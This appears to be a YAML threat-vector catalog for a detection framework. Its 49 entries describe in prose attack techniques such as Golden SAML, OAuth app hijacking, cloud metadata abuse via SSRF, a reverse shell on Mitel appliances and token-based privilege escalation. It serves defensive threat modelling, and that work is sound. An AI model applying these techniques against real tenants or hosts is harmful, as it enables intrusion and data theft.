description: Internal Reference to TIDeMEC existing threat actor vectors
icon: ☣️
name: Threat Vectors
field: vectors
model: true
keys:
  - id: TVM0001
    name: Conti Ransomeware Families Campaigns
    description: 'Conti is a Ransomware-as-a-Service that was first observed in December
      2019, and has being distributed via TrickBot. It has been used against major  corporations
      and government agencies, particularly those in North America. As with other
      ransomware families, actors using Conti steal sensitive files and information
      from compromised networks, and threaten to publish this data unless the ransom
      is paid.  Once on a system it will try to delete Volume Shadow Copies. It will
      try to  terminate a number of services using Restart Manager to ensure it can
      encrypt  files used by them. It will disable real time monitor and uninstall
      the Windows  Defender application. Default behaviour is to encrypt all files
      on local and  networked Server Message Block drives, ignoring files with DLL,
      .exe, .sys and .lnk  extensions. It is also able to target specific drives as
      well as individual  IP addresses. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0001%5D-Conti-Ransomeware-Families-Campaigns
  - id: TVM0002
    name: Work from Home Traffic Manipulation
    description: The actor compromised residential facility routers to prevent VPN
      (allowingwork from home employees to access internal resources)  from connecting,
      by giving them a bad gateway. The consequence for the user is that they couldn't
      perform their work, and had to  disable VPN so they could work.  Furthermore,
      the router was reconfigured to allow additional devices to join the target subnet,
      and thus gather further information and  compromise the victim's computer, leading
      to access to company information. The entire residential network was turned
      into a  flat network with no guest isolation.  Since the adversary had control
      over the router, they would also be able to perform Man-in-the-Middle attacks,
      leading to sniffing.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0002%5D-Work-from-Home-Traffic-Manipulation
  - id: TVM0003
    name: Addition of credentials to OAuth applications and service principals
    description: The actor has been observed adding credentials (x509 keys or password
      credentials) to one or more legitimate OAuth Applications or Service Principals,
      usually with existing Mail.Read or Mail.ReadWrite permissions, which grants
      the ability to read mail content from Exchange Online via Microsoft Graph or
      Outlook REST. Examples include mail archiving applications. Permissions are
      usually, but not always, AppOnly.  The actor may use their administrator privileges
      to grant additional permissions to the target Application or Service Principal
      (e.g.  Mail.Read, Mail.ReadWrite).
    criticality: Emergency
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0003%5D-Addition-of-credentials-to-OAuth-applications-and-service-principals
  - id: TVM0004
    name: Targeting of Delegated Administrative Priviledges
    description: Adversaries may target privileged accounts of service providers  to
      move laterally in cloud environments, leveraging the trusted  relationships
      to gain access to downstream customers and enable  further attacks or access
      targeted systems. This is a form of  supply chain attacks as it leverage the
      existing trust relation between the end target and the intermediary supplier
      which will be exploited first, before moving to their clients.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0004%5D-Targeting-of-Delegated-Administrative-Priviledges
  - id: TVM0005
    name: Modify Azure federation trust to accept externally signed tokens
    description: Once they acquired sufficient priviledges,attackers add their own
      certificate as  a trusted entity in the domain either by adding a new federation
      trust to  an existing tenant or modifying the properties of an existing federation  trust.
      As a result, any SAML token they create and sign will be valid for  the identity
      of their choosing. This attack may be performed as an alternative to the Golden
      SAML attack to gain persistent access without having to sign  the SAML response
      at each access request, while needing the same amount of control  over the ADFS
      server.
    criticality: Emergency
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0005%5D-Modify-Azure-federation-trust-to-accept-externally-signed-tokens
  - id: TVM0006
    name: Golden SAML
    description: 'With sufficient priviledges, the attackers access and extract the
      SAML signing  certificate. The certificate can then be used to create illicit
      but valid  SAML tokens that allow the actor to impersonate users, enabling them
      to access enterprise  cloud applications and services. Obtaining the SAML signing
      certificate normally entails  first querying the private encryption key that
      resides on the AD FS container and then  using that key to decrypt the signing
      certificate '
    criticality: Emergency
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0006%5D-Golden-SAML
  - id: TVM0007
    name: Usage of trusted cloud services to host malware stages
    description: Adversaries may use trusted cloud storage to host malware payloads.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0007%5D-Usage-of-trusted-cloud-services-to-host-malware-stages
  - id: TVM0008
    name: Modify Mailbox Folder Permissions
    description: By assigning read privileges to the Default user, an attacker can  then
      login as any user in the Microsoft 365 tenant and read the items  stored in
      the folder. First, the threat actor used . Then, the threat actor used a  low-privileged
      user to login on a daily basis and download messages from the mailboxes folders  that
      they previously modified. These logins were only recorded in Azure AD sign-ins
      because they were coded as non-interactive sign-ins. Mailbox folder  permissions
      can be added or modified using either the Outlook client or  PowerShell using
      the Add-MailboxFolderPermission or Set-MailboxFolderPermission cmdlets.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0008%5D-Modify-Mailbox-Folder-Permissions
  - id: TVM0009
    name: Hijack Azure AD Applications
    description: Hijacking an application (by adding a rogue secret or certificate)
      with granted permissions  will allow the attacker to access data that is normally
      protected by MFA requirements. Modification of an application via the browser
      - The attacker connected to the  Azure Portal with a web browser and added a
      new secret to an App Registration that had permissions to read all mail. There
      is no supported way to add a credential  to an Enterprise Application (service
      principal) via the browser. Modification of an application via PowerShell -
      The attacker connected to the Microsoft  365 tenant using Azure AD PowerShell.
      Once connected they added certificates to App  Registrations and Enterprise
      Applications that had the mail.read and files.read permission.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0009%5D-Hijack-Azure-AD-Applications
  - id: TVM0010
    name: Exchange Application Impersonation
    description: Impersonation grants an account the ability to access a mailbox and
      "act as" the mailbox  owner. This means that in addition to reading the mail
      in a target mailbox, the account  can perform other actions in Exchange as if
      it was the impersonated user.  After obtaining the right level of privilege,
      the threat actor logs into the  tenant using Exchange Online PowerShell and
      creates a new Management Role  Assignment. The threat actor will create a new
      assignment and give it a name  that blends in with other pre-existing assignments.
      The threat actor does not  create the role with any restricting scopes, and
      thus can access any mailbox in the tenant through impersonation.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0010%5D-Exchange-Application-Impersonation
  - id: TVM0011
    name: Malicious Software Dependencies Faking Known Packages
    description: Adversaries maymimick known and trusted software packages and distributors,
      with the intent to be mistaken for the original developer, and thus deliver
      malicious code that will be embedded in the victim's applications. They may
      use sophisticated automation to appear convincing and fool the target. Once
      delivered, the package may contain any payload, from crypto mining, to credential
      theft, command and control etc.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0011%5D-Malicious-Software-Dependencies-Faking-Known-Packages
  - id: TVM0012
    name: Malicious Script impersonating legitimate Windows Services and Tasks
    description: Adversary may try to impersonate a legitimate task or service in
      Windows to escape detection of their malicious scripts. This may range from
      simply naming the script with a familiar name, or create system process, scheduled
      tasks, registry keys and other host artifact which will try to appear and behave
      convingly. These scripts are often automated multi-stages, allowing further
      target  penetration and communicating with their C2 server for adversarial  control
      ultimately.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0012%5D-Malicious-Script-impersonating-legitimate-Windows-Services-and-Tasks
  - id: TVM0013
    name: DDoS and MitM with IP Spoofing
    description: IP spoofing is the creation of Internet Protocol (IP) packets which
      have a modified source address in order to either hide the identity of the sender,
      to impersonate another computer system, or both. It is a technique often used
      by bad actors to invoke DDoS attacks against a target device or the surrounding
      infrastructure. It is analogous to an attacker sending a package to someone
      with the wrong return address listed. If the person receiving the package wants
      to stop the sender from sending packages, blocking all packages from the bogus
      address will do little good, as the return address is easily changed. Relatedly,
      if the receiver wants to respond to the return address, their response package
      will go somewhere other than to the real sender. The ability to spoof the addresses
      of packets is a core vulnerability exploited by many DDoS attacks.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0013%5D-DDoS-and-MitM-with-IP-Spoofing
  - id: TVM0014
    name: SSL Certificate trust attack to achieve MitM
    description: There are several ways a bad actor can break the trust SSL/TLS establishes
      and launch a MITM attack. For example, a website’s server key could be stolen,
      allowing the attacker to appear as the server. In some cases, the issuing Certificate
      Authority (CA) is compromised and the root key is stolen, so criminals can generate
      their own certificates signed by the stolen root key. MITM can also result from
      a client’s  failure to validate the certificate against trusted CAs, or when
      a client is compromised and a fake CA is injected into the client trusted root
      authority. In many MITM attacks, malware performs this action to redirect users
      to fake banking web sites, where sensitive information can be easily stolen.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0014%5D-SSL-Certificate-trust-attack-to-achieve-MitM
  - id: TVM0015
    name: Clickjacking enterprise application users
    description: 'Clickjacking, also known as a "UI redress attack", is when an attacker
      uses  multiple transparent or opaque layers to trick a user into clicking on
      a button or link on another page when they were intending to click on the top
      level page. Thus, the attacker is "hijacking" clicks meant for their page and
      routing them to another page, most likely owned by another application, domain,
      or both. Using a similar technique, keystrokes can also be hijacked. With a
      carefully crafted combination of stylesheets, iframes, and text boxes, a user
      can be led to believe they are typing in the password to their email or bank
      account, but are instead typing into an invisible frame controlled by the attacker. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0015%5D-Clickjacking-enterprise-application-users
  - id: TVM0016
    name: Access path to unsecure bash history
    description: Adversaries may search the bash command history on compromised systems
      for insecurely stored credentials. Bash keeps track of the commands users type
      on the command-line with the "history" utility. Once a user logs out, the history
      is flushed to the user’s .bash_history file. On some web servers, it is possible
      that this file is not sufficiently access protected and may be accessible through
      simple directory access over HTTP requests, or other injection attacks.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0016%5D-Access-path-to-unsecure-bash-history
  - id: TVM0017
    name: Generic SQL injection to Web Services
    description: A SQL injection attack consists of insertion or "injection" of a
      SQL query via the input data from the client to the application. A successful
      SQL injection exploit can read sensitive data from the database, modify database
      data (Insert/Update/Delete), execute administration operations on the database
      (such as shutdown the DBMS), recover the content of a given file present on
      the DBMS file system and in some cases issue commands to the operating system.
      SQL injection attacks are a type of injection attack, in which SQL commands
      are injected into data-plane input in order to affect the execution of predefined
      SQL commands. Web applications typically use relational databases as a backend,
      where the user input may be abused to performed injection; which will have direct
      effect if the vulnerable application is mission-critical.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0017%5D-Generic-SQL-injection-to-Web-Services
  - id: TVM0018
    name: Function-as-code malwares
    description: 'A malware can run in a lambda function, which is an on-demand runtime
      environment, typically used dynamically but here abused as a computing platform
      by the adversary. The code will often be obfuscated in such an unusual way for
      functions, which are normally compact and easy to read, and communicates to
      the outside world to perform its intended actions. It was identified in crypto-mining
      operations, but may also be a pivot for other C2 orchestration tasks. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0018%5D-Function-as-code-malwares
  - id: TVM0019
    name: Persistence with Azure Automanage Machine Configuration
    description: 'Azure Policy enables administrators to define, enforce and remediate
      configuration standards on Azure resources and even on non Azure assets using
      Azure Arc. One key feature, that was released in 2021, is the guest configuration
      feature of Azure Policy. Azure Policy Guest  Configuration is now called Azure
      Automanage Machine Configuration.   Adversaries may use this functionality to
      gain persistence in an Azure  environment if they have gained the necessary
      permissions within the  subscription. And since Azure VMs are in many cases
      directly integrated  in the on-Premises Active Directory it is possible to gain
      additional  access there. '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0019%5D-Persistence-with-Azure-Automanage-Machine-Configuration
  - id: TVM0020
    name: Exposed data in public cloud storage
    description: 'Threat actors use tools to systematically and automatically scan
      the CSP IP spaces for publicly readable/writable storage buckets and threat
      actors  will copy/download data available.   Additionally, a threat actor with
      control of credentials to create or modify S3 buckets may create or modify buckets
      to allow exfiltration.  Threat actors are in these ways able to retrieve non-public
      data when  storage objects have not been configured well enough to prevent unintended  reads
      or writes.  '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0020%5D-Exposed-data-in-public-cloud-storage
  - id: TVM0021
    name: Usage of VPN providers to evade impossible travels
    description: 'Adversaries are aware of impossible travel detection and may try
      to leverage VPN providers egress nodes to collocate their attack operations
      with the victim''s point of presence. This is particularly efficient with cloud
      portal which are accessible from internet and which are by default more apt
      at detecting and protecting account abuses (for example with) geo-whitelisting. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0021%5D-Usage-of-VPN-providers-to-evade-impossible-travels
  - id: TVM0022
    name: Cloud Instance Metadata Abuse
    description: 'AWS Instance Metadata Service (IMDS) is a cloud service which exposes
      EC2 instances metadata to other AWS services. These metadata contain, amongst
      other leveregeable pieces of information, secret and access keys used by the
      instance. IMDS can be abused by an adversary to retrieve important information
      that will be used at later stages of the attack, as they will gain the same
      role as the credential they have retrieved. While the service is not vulnerable
      by default, version 1 of IMDS can be abused indrectly, by tricking vulnerable
      information running on the server to expose this information. Known procedures
      involve first using SSRF to trick the vulnerable stack into returning the IMDS
      response in the body of an error message, but other implementation are likely
      to be possible. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0022%5D-Cloud-Instance-Metadata-Abuse
  - id: TVM0023
    name: Cloud IAM role assumption
    description: Once adversaries gained a set of creentials, they will try to discover
      and leverage identity policies to increase their control over the infrastructure.
      This is especially the case for instance credentials, which can be stolen through
      exploitation ( see TVM0022). Changing roles will allow the adversary to assume
      a more powerful role, escalate privileges and eventually move further in the
      cloud to achieve objectives. This can be particularly impactful if cross account
      roles are leveraged.
    criticality: Severe
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0023%5D-Cloud-IAM-role-assumption
  - id: TVM0024
    name: Leverage open cloud traffic paths
    description: Adversaries may attempt to use open traffic paths between cloud resources
      based on misconfigurations or permissive policies. They would use similar techniques
      as traditional port scanning and then exploit open services on target machines,
      to move further into the cloud infrastructure. In cloud space, this is particularly
      important between public and private subnets, and on-premises connectivity.
      Lateral movement could happen from internet frontend to backend, from on-premises
      to cloud space, or from identity access to a compute instance, then transitioning
      into moving in the network plane.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0024%5D-Leverage-open-cloud-traffic-paths
  - id: TVM0025
    name: Web Shell Attacks
    description: Adversaries may backdoor web servers with web shells to establish
      persistent access to systems. A Web shell is a Web script that is placed on
      an openly accessible Web server to allow an adversary to use the Web server
      as a gateway into a network. A Web shell may provide a set of functions to execute
      or a command-line interface on the system that hosts the Web server.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0025%5D-Web-Shell-Attacks
  - id: TVM0026
    name: Non-Approved container image deployed to run cryptominer
    description: A threat actor can gain access to deployment workflows and pipelines
      and can then abuse acquired access to deploy images of their own choosing to
      deploy a cryptominer either directly via a malicious image, or by deploying
      a clean image first and then a cryptominer and C2 Infrastructure
    criticality: High
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0026%5D-Non-Approved-container-image-deployed-to-run-cryptominer
  - id: TVM0027
    name: Allow-listing of all actions in an AWS account via Exception Authority
    description: A threat actor that gains access to perform changes to the exception  authority
      can allow list an entire AWS account ID on the exception  authority, leading
      to no S2.SOC alerts in SIEM firing, effectively  making S2 blind to a specific
      part of an on-going compromise
    criticality: High
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0027%5D-Allow-listing-of-all-actions-in-an-AWS-account-via-Exception-Authority
  - id: TVM0028
    name: Follina backdoor delivered through malicious Office documents
    description: 'In May 2022, Microsoft published an advisory about CVE-2022-30190,
      which is about a Microsoft Windows Support Diagnostic Tool (MSDT) remote code  execution
      vulnerability. Attackers can inject a malicious external link to an OLE Object
      in a Microsoft Office document, then lure victims to click  or simply preview
      the document in order to trigger this exploit. It will  then execute a payload
      on the victim’s machine. Since this vulnerability  is a public exploit and has
      high severity, FortiGuard Labs published an  Outbreak Alert on 31st May and
      a blog article to address it on June 1, 2022.  During our tracking last month,
      we found a document that exploited  CVE-2022-30190, aka Follina, then downloaded
      Rozena to deploy a fileless  attack and leverage the public Discord CDN attachment
      service. Rozena is  a backdoor malware that is capable of injecting a remote
      shell connection  back to the attacker’s machine. In this blog we will explain
      how an attacker  delivers this payload through this vulnerability, along with
      details of  Rozena and its shellcode. Description source:  https://www.fortinet.com/blog/threat-research/follina-rozena-leveraging-discord-to-distribute-a-backdoor'
    criticality: Emergency
    tlp: red
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0028%5D-Follina-backdoor-delivered-through-malicious-Office-documents
  - id: TVM0029
    name: Gain initial access through Mitel VOIP application
    description: The threat actor performs a remote code execution (RCE)  exploit
      on the Mitel appliance to gain initial access to the environment. If an application
      is hosted on cloud-based infrastructure and/or is  containerized, then exploiting
      it may lead to compromise of the underlying  instance or container. The adversary
      uses the flaw to create an SSL-enabled  reverse shell via the "mkfifo" command
      and "openssl_client" to send outbound  requests from the compromised network.
      The "mkfifo" command is used to create  a special file specified by the file
      parameter and can be opened by multiple  processes for reading or writing purposes.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0029%5D-Gain-initial-access-through-Mitel-VOIP-application
  - id: TVM0030
    name: Emotet Trojan Families Campaigns
    description: 'Emotet is an advanced polymorphic banking trojan.  Adversaries may
      send spearphishing emails with  a malicious content in an attempt to gain access  to
      the victim systems. The email can inslude  attached document or embedded links
      to download  malicious file. The threat actor can drop an  additional malware
      self-cutomized module.  '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0030%5D-Emotet-Trojan-Families-Campaigns
  - id: TVM0031
    name: Leaky Access Tokens in AWS exposes user's data
    description: 'AWS tokens can be exposed by mistake and an attacker can accessed
      user''s personal data from different Amazon apps.  Example of token leakage
      could be a misconfiguration  of the com[.]amazon[.]gallery[.]thor[.]app[.]activity[.]ThorViewActivity  component.
      This may allow external application to access  the customer data.  '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0031%5D-Leaky-Access-Tokens-in-AWS-exposes-user%27s-data
  - id: TVM0032
    name: authentication bypass on Ivanti Connect Secure appliances
    description: 'Attackers may exploit vulnerabilities CVE-2023-46805 and CVE-2024-21893
      on Ivanti Connect Secure appliances (that provide remote VPN access to  corporate
      infrastructures) to bypass the authentication steps and  get access to resources
      on the appliance that would require authentication.    Exploition of those vulnerabilities
      following exploitation of CVE-2024-21887  enables full compromise of the appliance. '
    criticality: Severe
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0032%5D-authentication-bypass-on-Ivanti-Connect-Secure-appliances
  - id: TVM0033
    name: Use Valid Accounts to logon with SSH session
    description: 'Adversaries may use Valid Accounts to log into remote  machines
      using Secure Shell (SSH). The adversary may  then perform actions as the logged-on
      user. Adversaries may modify the SSH authorized_keys file  to maintain persistance
      on a victim host. The threat actor can use the active SSH session further to
      drop auxiliary customised modules of malware. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0033%5D-Use-Valid-Accounts-to-logon-with-SSH-session
  - id: TVM0034
    name: Discover and access exposed Kubernetes API
    description: Kubernetes API is a service used to administer a cluster. If exposed,
      an attacker would be to attempt authentication against it. In most cases, it
      is likely that the API will reject the request since the credentials are not
      known, although if further misconfigured, it may let through non-authenticated
      API calls - however the error codes may help the adversary identifying functioning
      targets, and lead to finding compromise path to break through the authentication,
      such as an unpatched vulnerability or a 0day.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0034%5D-Discover-and-access-exposed-Kubernetes-API
  - id: TVM0035
    name: Jenkins Gitlab plugin exploitation to compromise code resources
    description: Jenkins GitLab Plugin 1.5.34 and earlier does not  escape multiple
      fields inserted into the description  of webhook-triggered builds, resulting
      in a stored  cross-site scripting (XSS) vulnerability exploitable  by attackers
      with Item/Configure permission.  This allows attackers with Overall/Read permission  to
      connect to an attacker-specified HTTP server using  attacker-specified credentials
      IDs obtained through  another method, capturing credentials stored in Jenkins.
      This may result in cross-site request forgery (CSRF)  vulnerability. Plugin
      22.0.1 requires POST requests  and Overall/Administer permission for the affected  form
      validation methods.
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0035%5D-Jenkins-Gitlab-plugin-exploitation-to-compromise-code-resources
  - id: TVM0036
    name: Raspberry Robin worm in Windows networks
    description: 'Once the USB device is attached and the user clicks the link,  the
      worm spawns a msiexec process using cmd.exe to  launch a malicious file stored
      on the infected drive. This malware can use legitime Microsoft utilities as  fodhelper
      (a trusted binary in Windows settings), msiexec (command line Windows Installer
      component), odbcconf (a tool for configuring ODBC drivers).  While msiexec.exe
      downloads and executes legitimate  installer packages, adversaries may also
      leverage  it to deliver malware '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0036%5D-Raspberry-Robin-worm-in-Windows-networks
  - id: TVM0037
    name: Adversary in the Middle phishing sites to bypass MFA
    description: Threat actors use malicious attachments to send the users  to redirection
      site, which hosts a fake MFA login page. The MitM page completes the authentication
      flow by interfacing with the legitimate IdP, and captures valid accounts
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0037%5D-Adversary-in-the-Middle-phishing-sites-to-bypass-MFA
  - id: TVM0038
    name: Ransomware masquerading encrypted files with double extensions
    description: 'A threat actor can add a custom extension  to the encrypted files,
      such as ".jpg.crypted",  ".docx.locky" etc.  Targeted original filenames could
      be for example: .jpg, .docx, .lnk, .rtf, .pst, .docx, .jpg, .pdf  This technique
      is used for masquerading in  ransomware campaigns.  '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0038%5D-Ransomware-masquerading-encrypted-files-with-double-extensions
  - id: TVM0039
    name: Abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls
    description: Mark-of-the-Web (MOTW) bypass controls technique is working  on the
      principle to remove the Zone.Identifier alternate  data stream which identifies
      the file as downloaded from  the internet. Removing this parameter allows more
      freedom  in executing scripts in PowerShell and avoids opening files  in protected
      view. The threat actors may abuse specific file formats to subvert  Mark-of-the-Web
      (MOTW) controls. Adversaries may abuse container files such as compressed/archive  (.arj,
      .gzip) and/or disk image (.iso, .vhd) file formats to  deliver malicious payloads.  Container
      files downloaded from the Internet will be marked  with MOTW but the files within
      may not inherit the MOTW after  the container files are extracted and/or mounted.
      After a  container file is extracted and/or mounted, the files  contained within
      them may be treated as local files  on disk and run without protections.
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0039%5D-Abuse-specific-file-formats-to-subvert-Mark-of-the-Web-%28MOTW%29-controls
  - id: TVM0040
    name: Brute Ratel C4 used in adversarial operations
    description: 'Brute Ratel C4 is a red team tool that is effective in defeating  modern
      defensive EDR and AV capabilities. This tool allows users  to create payloads
      which they call "badgers" - corresponding to  the Cobalt Strike beacons. The
      payloads can be DLLs, EXEs, or  potentially other file formats. A threat actor
      can repackage  Brute Ratel C4 payloads into an ISO file to further infect   its
      victims.  The Brute Ratel C4 tool is used to spread an ISO file,  containing
      a LNK file using a OneDrive executable to launch  a malicious DLL Version.dll '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0040%5D-Brute-Ratel-C4-used-in-adversarial-operations
  - id: TVM0041
    name: Malicious container image deployed
    description: 'Threat actors plant malicious code into container images which  execute
      in target environment. This vector is used to perform  cryptominning activities
      and as a persistence technique. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0041%5D-Malicious-container-image-deployed
  - id: TVM0042
    name: Secrets embedded into container image used to access services
    description: 'Threat actors are scanning accessible container images for embedded
      secrets and use them to access services running on container or external ones. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0042%5D-Secrets-embedded-into-container-image-used-to-access-services
  - id: TVM0043
    name: Malicious Helm chart deployed
    description: 'Malicious Helm charts can be used modify Kubernetes authentication  and
      authorization resources, may contain exploits on continuos deployment tools
      and references to malicious container images which when deployed will execute
      attacker''s code. '
    criticality: High
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0043%5D-Malicious-Helm-chart-deployed
  - id: TVM0044
    name: Cryptomining activity in container
    description: 'Containerized environments are targeted by cryptominers to the ease  of
      deployment via exposed APIs and the potential for scaling  mining activities
      by deploying or compromising multiple containers  within an environment or cluster. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0044%5D-Cryptomining-activity-in-container
  - id: TVM0045
    name: Resource exhaustion DoS in CoP
    description: 'When to many Cloud on Prem resources are requested by one of the
      tenants than other users will not be able to  provision new services due to
      limited capacity. '
    criticality: Low
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0045%5D-Resource-exhaustion-DoS-in-CoP
  - id: TVM0046
    name: Unauthorized access to CMP or K8s API in CoP
    description: 'As management interfaces are exposed to all Commission workstations,  vulnerability
      or misconfiguration in Cloud on Prem APIs might be exploited via taken over
      workstation or malicious internal actor. '
    criticality: High
    tlp: amber
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0046%5D-Unauthorized-access-to-CMP-or-K8s-API-in-CoP
  - id: TVM0047
    name: Passing SeDebugPrivilege to AdjustTokenPrivilege API elevating privileges
      of a running process
    description: 'A threat actor can attempt to escalate privileges from a user or  administrator
      context to NT SYSTEM by using the SeDebugPrivilege to adjust  the memory of
      running process with a call to the AdjustTokenPrivilege API.  This method uses
      built-in Windows APIs and commands to escalate privileges  by changing the privileges
      of the running process in-memory. See Palantir  reference.   The intention of
      access token impersonation/theft is to grant a process the  same permissions
      as another running process with a specific context, often  NT SYSTEM. This may
      increase the capabilities of the now-elevated process  or reduce its probability
      of detection.  For access token impersonation an adversary can use standard
      command-line  shell to initiate ''runas'' commands or to use payloads that call
      Windows  token APIs directly. The changes in Windows API calls can manipulate  access
      tokens for further account access and malicious purposes.  '
    criticality: Medium
    tlp: clear
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0047%5D-Passing-SeDebugPrivilege-to-AdjustTokenPrivilege-API-elevating-privileges-of-a-running-process
  - id: TVM0048
    name: Microsoft Exchange server backdoor Session Manager
    description: 'A malware, dubbed SessionManager is a malicious  native-code module
      for Microsoft''s Internet Information  Services (IIS) web server software. Dropping
      an IIS module  as a backdoor enables threat actors to maintain persistent.  The
      malicious actor uses specifically crafted HTTP  requests from their operators,
      trigger actions based  on the operator''s hidden instructions if any,  then
      transparently pass the request to the server  for it to be processed just like
      any other reques.  With this technique can be executed for example  modules
      like: PowerSploit-based Mimikatz reflective  loader, Mimikatz SSP, ProcDump,
      and a legitimate  Avast memory dump tool. '
    criticality: Medium
    tlp: green
    link: Engines\documentation\wiki\Knowledge-GraphThreat-Vectors%E2%98%A3%EF%B8%8F-%5BTVM0048%5D-Microsoft-Exchange-server-backdoor-Session-Manager
  - id: TVM0049
    name: Create a process with a token
    description: 'Adversaries may create a new process with a different token  to
      escalate privileges and bypass access controls. A processes  can be created
      with the token and resulting security context  of another user using features
      such as CreateProcessWithTokenW  and runas.  An adversary creates a new access
      token with DuplicateToken(Ex)  and uses it with CreateProcessWithTokenW to create
      a new process  running under the security context of the impersonated user.  This
      is useful for creating a new process under the security  context of a different
      user. '
    criticality: High
